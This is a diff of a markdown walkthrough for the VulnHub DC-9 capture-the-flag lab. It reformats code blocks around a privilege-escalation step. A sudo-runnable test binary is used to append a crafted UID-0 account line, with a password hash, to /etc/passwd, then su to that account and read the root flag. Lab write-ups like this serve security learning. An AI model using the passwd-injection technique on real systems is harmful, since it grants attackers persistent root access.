@@ -478,6 +478,7 @@ $1$fyezool$.vWu.gTMGAKT73babJKR00
 
 
 Add new user:password:root/bash
+
 `fyezool:$1$fyezool$.vWu.gTMGAKT73babJKR00:0:0:root/root:/bin/bash`
 
 ![c71999019c3719036624e324653e147c.png](/images/vulnhub/dc-9/8d3c5497dcdf4009bedcc1b05cf9a8eb.png)
@@ -487,13 +488,17 @@ Now, run `sudo /opt/devstuff/dist/test/test abc.txt /etc/passwd`
 To check if the new user is added, just run `cat /etc/password | grep fyezool`
 ![122537428c8edba8196e83740ae9fccc.png](/images/vulnhub/dc-9/5627f1900e2f4ab390356d814c587195.png)
 
+```bash
 su fyezool
 password : fyezool
+```
+
 ![d60fb1955dc395bde32130fe05d03855.png](/images/vulnhub/dc-9/6923c5eeeb5a42c582139731b5cbe2e2.png)
 
-bash
+```bash
 cd /root
-cat 
+cat theflag.txt
+```
 
 ![96b80336407a19d27c45aceb27f21b2f.png](/images/vulnhub/dc-9/4f134355f16a4dacb8977e8973e1ac83.png)
 
